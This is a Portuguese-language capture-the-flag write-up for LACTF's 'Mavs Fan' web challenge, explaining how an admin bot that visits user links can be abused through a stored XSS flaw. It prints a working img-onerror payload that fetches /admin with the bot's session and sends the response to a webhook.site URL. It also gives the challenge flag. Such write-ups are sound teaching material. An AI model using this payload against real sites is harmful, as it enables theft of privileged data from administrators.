# Writeup: Mavs Fan

**Plataforma**: LACTF\
**Categoria**: Web Exploitation\
**Autor**: stewie

---

## Descrição

Just a Mavs fan trying to figure out what Nico Harrison cooking up for my team nowadays...

O desafio gira em torno de um site onde um administrador, representado pelo **ADMIN BOT**, acessa links enviados pelos usuários. O objetivo é explorar essa mecânica para forçar o bot a acessar uma página restrita e exfiltrar a flag.

**Hint** - You can send a link to your post that the admin bot will visit. Note that the admin cookie is HttpOnly!

---

## Desafio

O desafio "Mavs Fan" apresenta um site vulnerável a **Cross-Site Scripting (XSS)**, permitindo a execução de scripts arbitrários no contexto do usuário administrador. Como o bot administrador visita links fornecidos pelos usuários, podemos explorar essa vulnerabilidade para fazer com que ele acesse a página restrita `/admin` e nos envie a flag.

---

## Solução

### 🔗 1. Webhook

Como não temos acesso direto ao painel `/admin`, precisamos de uma maneira de capturar os dados da flag quando o **ADMIN BOT** acessar a página. Como o bot visita links fornecidos por nós e executa nosso código malicioso, podemos aproveitar isso para exfiltrar a flag.

Para isso, utilizamos um **webhook**, que nos permite receber requisições HTTP em um endpoint controlado por nós. Dessa forma, podemos enviar a flag capturada diretamente para o webhook e visualizá-la remotamente.

### 📡 2. Como funciona o Webhook

O webhook é uma ferramenta que permite capturar requisições HTTP em tempo real. Ele gera uma URL única para onde podemos enviar dados, e, ao acessarmos o site do webhook, conseguimos visualizar todas as requisições recebidas.

Neste caso, usamos o webhook para receber a flag extraída do painel `/admin`. Assim que o **ADMIN BOT** executa o script, ele faz uma requisição GET para nosso webhook com a flag como parâmetro da URL.

---

### 🔍 3. Testando a vulnerabilidade XSS

Inicialmente, testamos a injeção de JavaScript diretamente no campo de mensagens do site:

```html
<script>
  alert("JavaScript Executado!");
</script>
```

Isso resultou em um erro, indicando que a filtragem do site bloqueava tags `<script>`.

Em seguida, testamos a carga de um evento `onerror` em uma tag de imagem:

```html
<img src="x" onerror="alert('Executou!')" />
```

Este payload foi bem-sucedido, confirmando a vulnerabilidade XSS.

---

### 🚀 4. Explorando o XSS para extrair a flag

A flag estava em uma parte do site onde não tínhamos permissão de acesso direta. Como sabíamos que o **ADMIN BOT** acessaria links enviados, elaboramos um script que forçava o bot a acessar `/admin` e enviava a resposta para um **webhook** controlado por nós.

O código injetado foi:

```html
<img
  src="x"
  onerror="
fetch('/admin')
  .then(response => response.text())
  .then(flag => {
    new Image().src = 'https://webhook.site/1e751fa9-a7b3-44cd-8ab6-13ecef250d7a?flag=' + encodeURIComponent(flag);
  });
"
/>
```

Este código:

1. Executa uma requisição **fetch()** para a página restrita `/admin`, utilizando as credenciais do **ADMIN BOT**.
2. Captura a resposta, que contém a flag.
3. Envia a flag para o webhook através de uma requisição de imagem (`new Image().src`).

---

### 🎯 5. Executando o ataque

1. Inserimos o payload no campo de mensagens do site.
2. Copiamos a URL gerada e a enviamos para o **ADMIN BOT**.
3. O bot acessou o site com permissões de administrador e executou nosso script.
4. Nosso webhook recebeu uma requisição GET contendo a flag na resposta.

**Imagem da flag obtida pelo webhook:**

---

## 🏆 Flag

```
lactf{m4yb3_w3_sh0u1d_tr4d3_1uk4_f0r_4d}
```

---

## Autores da WriteUp

[Membro de Networking - jvittor1](https://github.com/jvittor1)

[Membro de Networking - gabrielhdsalves](https://github.com/gabrielhdsalves)
